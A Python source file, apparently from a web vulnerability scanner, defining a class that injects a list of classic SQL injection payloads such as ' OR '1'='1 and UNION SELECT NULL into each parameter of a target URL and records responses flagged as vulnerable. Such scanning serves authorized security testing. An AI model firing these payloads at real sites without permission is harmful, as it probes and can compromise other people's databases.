from typing import Dict, List
from core.request_handler import RequestHandler
from core.vulnerability_detector import VulnerabilityDetector

class SQLScanner:
    def __init__(self):
        self.request_handler = RequestHandler()
        self.vulnerability_detector = VulnerabilityDetector()
    
    def scan(self, url: str, parameters: Dict = None) -> List[Dict]:
        vulnerabilities = []
        if not parameters:
            parameters = {'id': '1', 'user_id': '1'}
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR '1'='1'--",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1' AND '1'='1",
            "1' AND 1=1--",
            "' OR 'a'='a"
        ]
        for param_name in parameters.keys():
            for payload in payloads:
                test_params = parameters.copy()
                test_params[param_name] = payload
                response = self.request_handler.send_request(
                    url,
                    method='GET' if '?' in url else 'POST',
                    data=test_params
                )
                is_vulnerable, details = self.vulnerability_detector.detect(
                    response,
                    'SQL',
                    payload
                )
                if is_vulnerable:
                    vulnerabilities.append({
                        'type': 'SQL Injection',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        **details
                    })
        return vulnerabilities